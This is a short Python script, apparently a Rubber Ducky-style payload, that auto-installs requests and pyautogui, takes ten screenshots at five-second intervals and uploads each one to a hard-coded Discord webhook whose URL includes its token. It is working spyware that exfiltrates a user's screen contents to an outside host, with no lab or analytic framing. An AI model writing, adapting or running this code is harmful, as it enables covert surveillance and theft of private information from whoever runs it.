import subprocess
import sys

#Function to install required dependencies
def install_dependency(package):
    subprocess.check_call([sys.executable, "-m", "pip","install",package])
    
#List of required dependencies
required_packages=["requests","pyautogui"]

#Install missing dependencies
for package in required_packages:
    try:
        __import__(package)
    except ImportError:
        print(f"Installing {package}...")
        install_dependency(package)
        
#Importing the installed and required dependencies    
import pyautogui
from time import sleep
import requests
from time import sleep

# YOUR DISCORD WEBHOOK
discord_webhook = "https://discord.com/api/webhooks/1349331654212325408/XNELQlQ8kphehfa0LI_sw5AMrQXRfHcbwWIMDa03MOhy0Ryp54pD3h8WtBCOBeQP3OMC"

# Screenshot Settings
SCREENSHOTS = 10
TIMING = 5

for i in range(SCREENSHOTS):
    sleep(TIMING)

    # take the screenshot
    screenshot = pyautogui.screenshot()
    screenshot.save("screenshot.png")

    with open("screenshot.png", "rb") as f:
        foto = f.read()

    richiesta = {
        "username": "AbhinavDucky"
    }

    # Send the message by attaching the photo
    response = requests.post(discord_webhook, data=richiesta, files={"Screen#"+str(i)+".png": foto})

    # Debugging
    if response.status_code == 200:
         print("Photo successfully sent!")
    else:
         print("Error while submitting photo." + str(response.status_code))
